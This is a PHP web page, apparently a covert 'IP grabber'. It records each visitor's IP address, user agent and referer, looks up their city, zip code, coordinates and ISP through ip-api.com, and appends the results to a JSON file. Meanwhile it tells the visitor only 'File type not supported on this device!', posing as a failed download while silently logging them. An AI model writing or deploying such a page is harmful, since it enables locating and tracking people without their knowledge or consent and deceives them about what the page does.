<!DOCTYPE html>
<html>
<head>
    <title>User Information</title>
</head>
<body>
<?php
// Function to get user IP address
function getUserIP() {
    // Get real visitor IP behind CloudFlare network
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
        $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
        $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
    }
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP)) {
        $ip = $client;
    } elseif(filter_var($forward, FILTER_VALIDATE_IP)) {
        $ip = $forward;
    } else {
        $ip = $remote;
    }

    return $ip;
}

// Get user agent
$user_agent = $_SERVER['HTTP_USER_AGENT'];

// Get referer
$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';

// Get user's IP address
$user_ip = getUserIP();

// Parse user agent string to get device model
$device_model = 'Unknown';
if (preg_match('/\((.*?)\)/', $user_agent, $matches)) {
    $device_model = $matches[1];
}

// Get additional information using ip-api.com API
$api_url = "http://ip-api.com/json/{$user_ip}?fields=status,message,country,regionName,city,zip,lat,lon,isp,org,as";

// Initialize cURL session
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, $api_url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

// Execute cURL session
$response = curl_exec($curl);

// Close cURL session
curl_close($curl);

// Decode JSON response
$info = json_decode($response, true);

// Create an array to hold all the information
$user_info = array(
    'IP Address' => $user_ip,
    'Device Model' => $device_model,
    'User Agent' => $user_agent,
    'Referer' => $referer,
    'Country' => $info['country'],
    'Region' => $info['regionName'],
    'City' => $info['city'],
    'Zip Code' => $info['zip'],
    'Latitude' => $info['lat'],
    'Longitude' => $info['lon'],
    'ISP' => $info['isp'],
    'Organization' => $info['org'],
    'AS' => $info['as'],
    'Timestamp' => date('Y-m-d H:i:s')
);

// Convert array to JSON format
$json_data = json_encode($user_info, JSON_PRETTY_PRINT);

// File to store user data
$file = 'user_data.json';

// Save data to file
file_put_contents($file, $json_data . "\n", FILE_APPEND | LOCK_EX);

// Output some response (optional)
echo "File type not supported on this device!";
?>
</body>
</html>
